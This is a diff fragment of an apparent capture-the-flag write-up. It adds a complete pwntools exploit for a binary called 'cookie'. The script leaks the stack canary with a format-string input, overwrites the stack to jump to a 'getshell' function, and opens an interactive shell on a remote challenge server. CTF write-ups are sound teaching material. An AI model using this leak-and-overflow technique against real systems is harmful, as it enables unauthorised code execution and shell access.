@@ -54,4 +54,38 @@ payload = flat(
 
 ```
 
+## Exploit Script
+Here is the final solution:
+
+```python
+from pwn import *
+
+exe = './cookie'
+elf = ELF(exe)
+context.binary = elf
+# p = process(exe)
+p = remote("34.40.105.109",32470)
+log.info("Phase 1: Leaking Canary with %21$p...")
+
+p.sendline(b'%21$p')
+
+p.recvuntil(b"0x")
+canary_leak = int(p.recvline().strip(), 16)
+log.success(f"Canary Leaked: {hex(canary_leak)}")
+
+log.info("Phase 2: Overwriting Stack...")
+
+padding = b'A' * 104
+
+canary_payload = p64(canary_leak)
+rbp_padding = b'a' * 8
+win_address = p64(elf.symbols['getshell'])
+simple_ret_gadget = p64(0x00000000004005d6)
+
+payload = padding + canary_payload + rbp_padding + simple_ret_gadget + win_address
+
+p.sendline(payload)
+p.interactive()
+```
+
 ---
